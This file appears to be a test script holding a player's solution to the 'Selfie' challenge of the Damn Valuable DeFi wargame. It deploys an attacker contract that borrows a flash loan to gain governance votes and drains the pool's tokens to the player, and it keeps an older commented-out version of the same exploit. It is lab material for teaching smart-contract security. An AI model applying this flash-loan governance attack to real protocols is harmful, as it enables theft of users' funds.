const { ethers } = require('hardhat')
const { expect } = require('chai')
const { time } = require('@nomicfoundation/hardhat-network-helpers')

describe('[Challenge] Selfie', function () {
  let deployer, player
  let token, governance, pool

  const TOKEN_INITIAL_SUPPLY = 2000000n * 10n ** 18n
  const TOKENS_IN_POOL = 1500000n * 10n ** 18n

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    ;[deployer, player] = await ethers.getSigners()

    // Deploy Damn Valuable Token Snapshot
    token = await (
      await ethers.getContractFactory('DamnValuableTokenSnapshot', deployer)
    ).deploy(TOKEN_INITIAL_SUPPLY)

    // Deploy governance contract
    governance = await (
      await ethers.getContractFactory('SimpleGovernance', deployer)
    ).deploy(token.address)
    expect(await governance.getActionCounter()).to.eq(1)

    // Deploy the pool
    pool = await (
      await ethers.getContractFactory('SelfiePool', deployer)
    ).deploy(token.address, governance.address)
    expect(await pool.token()).to.eq(token.address)
    expect(await pool.governance()).to.eq(governance.address)

    // Fund the pool
    await token.transfer(pool.address, TOKENS_IN_POOL)
    await token.snapshot()
    expect(await token.balanceOf(pool.address)).to.be.equal(TOKENS_IN_POOL)
    expect(await pool.maxFlashLoan(token.address)).to.eq(TOKENS_IN_POOL)
    expect(await pool.flashFee(token.address, 0)).to.eq(0)
  })

  it('Execution', async function () {
    /** CODE YOUR SOLUTION HERE */

    const Attacker = await ethers.getContractFactory('SelfieAttacker')
    const attacker = await Attacker.deploy(
      token.address,
      governance.address,
      pool.address,
      player.address
    )

    await attacker.getLoan()
    // await time.increase(time.duration.days(3))
    await time.increase(3 * 24 * 60 * 60)
    await attacker.execute()
  })

  after(async function () {
    /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

    // Player has taken all tokens from the pool
    expect(await token.balanceOf(player.address)).to.be.equal(TOKENS_IN_POOL)
    expect(await token.balanceOf(pool.address)).to.be.equal(0)
  })
})

// v1

// const { ether, time } = require("@openzeppelin/test-helpers");
// const { accounts, contract } = require("@openzeppelin/test-environment");

// const DamnValuableTokenSnapshot = contract.fromArtifact(
//   "DamnValuableTokenSnapshot"
// );
// const SelfiePool = contract.fromArtifact("SelfiePool");
// const SimpleGovernance = contract.fromArtifact("SimpleGovernance");
// const HackSelfie = contract.fromArtifact("HackSelfie");

// const { expect } = require("chai");

// describe("[Challenge] Selfie", function () {
//   const [deployer, attacker, ...otherAccounts] = accounts;

//   const TOKEN_INITIAL_SUPPLY = ether("2000000");
//   const TOKENS_IN_POOL = ether("1500000");

//   before(async function () {
//     /** SETUP SCENARIO */
//     this.token = await DamnValuableTokenSnapshot.new(TOKEN_INITIAL_SUPPLY, {
//       from: deployer,
//     });
//     this.governance = await SimpleGovernance.new(this.token.address, {
//       from: deployer,
//     });
//     this.pool = await SelfiePool.new(
//       this.token.address,
//       this.governance.address,
//       { from: deployer }
//     );

//     await this.token.transfer(this.pool.address, TOKENS_IN_POOL, {
//       from: deployer,
//     });

//     expect(await this.token.balanceOf(this.pool.address)).to.be.bignumber.equal(
//       TOKENS_IN_POOL
//     );
//   });

//   it("Exploit", async function () {
//     /** YOUR EXPLOIT GOES HERE */
//     const hack = await HackSelfie.new(
//       this.token.address,
//       this.pool.address,
//       this.governance.address,
//       { from: deployer }
//     );

//     await hack.attack({ from: attacker });
//     await time.increase(time.duration.days(3));
//     await hack.attack2();
//   });

//   after(async function () {
//     /** SUCCESS CONDITIONS */
//     expect(await this.token.balanceOf(attacker)).to.be.bignumber.equal(
//       TOKENS_IN_POOL
//     );
//     expect(await this.token.balanceOf(this.pool.address)).to.be.bignumber.equal(
//       "0"
//     );
//   });
// });
